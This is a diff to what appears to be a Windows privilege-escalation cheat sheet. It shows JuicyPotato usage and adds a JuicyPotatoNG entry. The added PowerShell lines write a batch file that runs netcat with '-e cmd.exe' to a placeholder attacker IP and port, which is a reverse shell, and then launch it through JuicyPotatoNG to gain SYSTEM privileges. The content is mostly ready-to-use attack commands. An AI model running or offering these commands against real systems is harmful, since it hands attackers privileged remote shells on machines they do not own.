@@ -47,3 +47,10 @@ REM -l <port>: COM server listen port
 REM example
 C:\Windows\Temp\juicypotato.exe -p C:\Windows\Temp\rev.bat -l 4444 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 ```
+
+[JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
+
+```powershell
+echo C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port> > rev.bat
+.\JuicyPotatoNG.exe -t * -p C:\Windows\Temp\rev.bat
+```
